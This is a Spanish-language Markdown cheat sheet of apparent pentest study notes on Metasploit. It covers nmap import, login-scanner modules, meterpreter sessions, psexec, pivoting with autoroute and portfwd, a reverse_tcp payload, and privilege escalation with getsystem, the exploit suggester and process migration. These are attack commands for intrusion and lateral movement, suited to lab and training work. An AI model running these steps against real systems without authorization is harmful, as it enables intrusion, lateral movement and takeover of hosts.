# metasploit

## exportar un scan de nmap a metasploit

podemos exportar un scan de nmap a una consola de metasploit mediante el parametro -oX (que lo exporta en formato XML)

* en primer lugar levanta un servicio de postgresql y posteriormente en el consola de metasploit hacer un db\_status

```
service postgresql start
```

```
db_status
```

* creamos un nuevo workspace en mestasploit

```
workspace -a <nombre>
```

* despues hacemos un

```
db_import <ruta a nuestro scan>
```

* para confirmar que se ha hecho correctamente podemos hacer un

```
hosts
```

```
services
```

* tambien se puede hacer con el comando

```
db_nmap -Pn -sV -O <ip>
```

## explotacion

```
search mysql_login 
```

```
search ssh_login
```

```
search smb_login
```

```
search winrm_login
```

para upgradear la sesión a meterpreter:

```
sessions -u 1 
```

para eliminar una sesión

```
sessions -k 1 
```

para iniciar sesión en la maquina

```
search psexec type:exploit
```

para hacer esto de forma manual:

```
/usr/share/doc/python3-impacket/examples/psexec.py <usuario>@<ip>
```

## como hacer el pivoting en metasploit

en primer lugar tenemos que identificar que maquina es desde la que tenemos accaeso a una interfaz de red diferente

```
arp -a 
```

para ver las interfaces de red de la maquina en la que estemos opodemos hacer ipconfig y buscar otra interfaz que no sea la que nosotros hemos detectado con nmap

en primer lugar agregamos la ip de la nueva interfaz a la route table

```
run autoroute -s <ip de la nueva red con su mascara de red>
```

para ver las tablas de enrutamiento:

```
route print
```

para ver los puertos de la maquina que esta en la nueva red

```
use /auxiliary/scanner/portscan/tcp
```

ahora tenemos que hacer un portforwarding de los puertos que hemos encontrao en la anterior maquina que estaba en la otra subred

```
portfwd add -l <puerto nuestra maquina metasploit> -p <puerto de la maquina nueva red> -r <ip nueva maquina a la que queremos hacerle el portforwarding>
```

para ver los portforwardings que tenemos hechos:

```
portfwd list
```

y ya tendriamos acceso desde nuestra maquina kali a la nueva red, ya podriamos trabajar con nmap desde nuestra mauqina kali

```
nmap -p <puerto que hayamos indicado en el portfwd> <localhost>
```

```
set payload windows/meterpreter/reverse_tcp
```

## Elevar Privilegios

```
getsystem
```

```
search suggester
SESSION <sesión>
```

```
pgrep explorer
migrate <id>
```

en el caso de tener el privilegio de SeImpersonatePrivilege podemos escalar privilegios con access toker impersonation
